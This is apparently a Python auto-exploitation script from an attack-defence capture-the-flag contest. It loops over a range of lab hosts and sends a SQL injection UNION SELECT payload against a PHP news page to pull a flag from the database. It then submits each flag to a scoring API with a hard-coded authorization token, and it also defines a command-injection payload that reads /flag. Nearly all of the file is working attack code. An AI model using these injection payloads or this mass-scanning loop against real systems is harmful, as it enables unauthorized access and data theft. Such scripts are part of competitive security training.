import requests
import json
import os
import re
import time

ip_pre = "192.168.100."
attack_code = 'http://192.168.100.101:48180/sport/product_show.php?id=system("cat /flag")'
url_pre = "http://"
url_aft = ':48180/sport/news_show.php?id=-3761%20UNION%20ALL%20SELECT%20CONCAT(0x716a716a71,IFNULL(CAST(flag%20AS%20CHAR),0x20),0x71767a7671)%20FROM%20sport.flagTbl--%20-'

fail = ""


flag = {"flag": ""}
headers = {"Content-Type": "application/json",
"Authorization": "aa59cbb070f753956f33229a9f511791"}

while True:
    for i in range(101, 171):
        if i == 105:
            continue
        ip = ip_pre + str(i)
        url = url_pre + ip + url_aft
        try:
            r = requests.get(url)
            temp = re.findall(r"hctf\{(.+?)\}", r.text)[0].encode()
            flag["flag"] = "hctf{" + temp + "}"
            flag_post = json.dumps(flag)
            r = requests.post("http://10.8.0.1:19999/api/flag", headers=headers, data=flag_post)
            print(ip + "\t" + str(flag) + "\t" + r.text)
            # os.system()
            # curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: aa59cbb070f753956f33229a9f511791" -d "{ \"flag\": \"your_flag_here\" }"
        except:
            fail = fail + url + '\n' 

    print(fail)
    time.sleep(60)
